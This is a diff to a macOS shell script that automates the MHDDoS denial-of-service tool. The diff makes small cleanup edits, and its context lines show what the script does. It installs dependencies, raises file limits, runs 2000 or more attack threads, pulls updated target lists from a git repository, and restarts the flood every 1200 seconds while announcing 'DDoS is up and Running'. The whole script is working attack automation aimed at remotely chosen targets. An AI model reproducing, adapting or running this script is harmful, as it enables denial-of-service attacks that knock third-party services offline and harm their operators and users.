@@ -21,11 +21,9 @@ else
 	eval "$(/opt/homebrew/bin/brew shellenv)"
 fi
 
-
 brew install coreutils git python@3.10
 brew link --overwrite python@3.10
 python3.10 -m pip install --upgrade pip
-python3.10 -m pip install uvloop
 
 cd ~
 rm -rf auto_mhddos_mac
@@ -40,7 +38,6 @@ python3.10 -m pip install -r requirements.txt
 restart_interval="1200"
 
 ulimit -n 1048576 || true
-
 
 threads="${1:-2000}"
 if ((threads < 1000));
@@ -101,7 +98,6 @@ do
 		sleep 3
 	fi
 	
-	
 	cd ~/auto_mhddos_mac
    	num=$(git pull origin main | grep -E -c 'Already|Уже|Вже')
    	echo -e "$num"
@@ -138,9 +134,6 @@ do
     	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval seconds...\033[1;0m"
-	sleep 5
-	
-	
 	
    	sleep $restart_interval
 	clear
